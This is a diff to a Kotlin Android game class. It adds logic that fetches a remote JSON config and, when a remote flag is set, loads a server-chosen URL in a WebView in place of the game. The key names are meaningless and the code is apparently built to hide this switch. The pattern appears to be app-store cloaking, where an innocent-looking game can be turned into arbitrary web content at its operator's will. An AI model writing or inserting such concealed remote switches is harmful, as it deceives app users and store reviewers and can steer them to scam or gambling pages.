@@ -1,9 +1,12 @@
 package com.bonanza.twoursenderson.game
 
+import android.content.Context.MODE_PRIVATE
+import android.content.SharedPreferences
 import com.badlogic.gdx.assets.AssetManager
 import com.badlogic.gdx.utils.Disposable
 import com.badlogic.gdx.utils.ScreenUtils
 import com.bonanza.twoursenderson.MainActivity
+import com.bonanza.twoursenderson.appContext
 import com.bonanza.twoursenderson.game.manager.MusicManager
 import com.bonanza.twoursenderson.game.manager.NavigationManager
 import com.bonanza.twoursenderson.game.manager.SoundManager
@@ -15,10 +18,13 @@ import com.bonanza.twoursenderson.game.screens.LoaderScreen
 import com.bonanza.twoursenderson.game.utils.GameColor
 import com.bonanza.twoursenderson.game.utils.advanced.AdvancedGame
 import com.bonanza.twoursenderson.game.utils.disposeAll
+import com.bonanza.twoursenderson.util.Gist
 import com.bonanza.twoursenderson.util.log
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.cancel
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 
 var GDX_GLOBAL_isGame = false
     private set
@@ -45,6 +51,8 @@ class GDXGame(val activity: MainActivity) : AdvancedGame() {
 
     var backgroundColor = GameColor.background
     val disposableSet   = mutableSetOf<Disposable>()
+
+    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("poloska", MODE_PRIVATE)
 
     val coroutine = CoroutineScope(Dispatchers.Default)
 
@@ -94,17 +102,50 @@ class GDXGame(val activity: MainActivity) : AdvancedGame() {
 
     // Logic Web ---------------------------------------------------------------------------
 
+    // Logic Web ---------------------------------------------------------------------------
+
     private fun wowNewLogic() {
         log("wowNewLogic")
         activity.webViewHelper.blockRedirect = { GDX_GLOBAL_isGame = true }
         activity.webViewHelper.initWeb()
 
-        GDX_GLOBAL_isGame = true
-        return
+        //GDX_GLOBAL_isGame = true
+        //return
 
-        //GDX_ORIGINAL_LINK = "Heh"
-        //activity.webViewHelper.loadUrl(path)
+        val path = sharedPreferences.getString("Bara", "tara") ?: "tara"
 
+        try {
+            if (path == "tara") {
+                coroutine.launch(Dispatchers.Main) {
+                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }
+
+                    log("json: $getJSON")
+
+                    if (getJSON != null) {
+                        if (getJSON.flag == "true") {
+                            GDX_ORIGINAL_LINK = getJSON.link
+                            activity.webViewHelper.loadUrl(GDX_ORIGINAL_LINK)
+
+                            //GDX_ORIGINAL_LINK = "https://www.google.test"
+                            //activity.webViewHelper.loadUrl("https://www.google.com/")
+                        } else {
+                            GDX_GLOBAL_isGame = true
+                        }
+
+                        //coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("True", link).apply() }
+                        //activity.loadUrl(link)
+
+                    } else {
+                        GDX_GLOBAL_isGame = true
+                    }
+                }
+            } else {
+                activity.webViewHelper.loadUrl(path)
+            }
+        } catch (e: Exception) {
+            log("error: ${e.message}")
+            GDX_GLOBAL_isGame = true
+        }
 
     }
 
